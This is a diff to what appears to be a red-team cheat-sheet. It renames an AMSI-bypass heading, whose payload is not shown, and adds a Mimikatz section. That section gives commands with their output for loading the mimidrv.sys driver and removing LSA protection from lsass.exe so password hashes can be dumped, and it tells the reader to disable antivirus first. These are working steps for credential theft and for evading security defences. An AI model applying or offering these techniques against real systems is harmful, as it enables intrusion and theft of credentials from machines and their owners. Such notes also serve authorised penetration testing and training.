@@ -62,9 +62,9 @@ Console.WriteLine("Length was: " + buf.Length.ToString());
 ```
 
 
-# Bypass AMSI
+# Bypass Antimalware Scan Interface (AMSI)
 
-Using one of the bypasses from `amsi.fail` which is detected:
+Using one of the bypasses from `https://amsi.fail` which is detected:
 
 ```powershell
 
@@ -131,6 +131,30 @@ namespace PowerShell_RunSpace
 }
 
 ```
+
+# Mimikatz
+
+## Disable LSA Protection (PPL protection)
+
+To bypass/disable LSA protection to dump hashes, we need to have the `SeLoadDriverPrivilege` privilege enabled to load `mimidrv.sys` driver. By default the `NT AUTHORITY\SYSTEM` account has the highest privileges on the local computer and it has the `SeLoadDriverPrivilege` privilege enabled. 
+
+Using 
+```
+mimikatz # !+ 
+[*] 'mimidrv' service not present
+[+] 'mimidrv' service successfully registered
+[+] 'mimidrv' service ACL to everyone
+[+] 'mimidrv' service started
+```
+After loading the driver, run the `!processprotect` command from mimikatz prompt with providing the `lsass.exe` process as the following: 
+
+```
+mimikatz # !processprotect /process:lsass.exe /remove
+Process : lsass.exe
+PID 536 -> 00/00 [0-0-0]
+```
+One drwaback of this technique is it require to upload the `minidrv.sys` driver to the target, which most likely it will be flagged by anti-virus. Ensure that the AV is disabled before using thie method.
+
 
 # Attacking MSSQL 
 
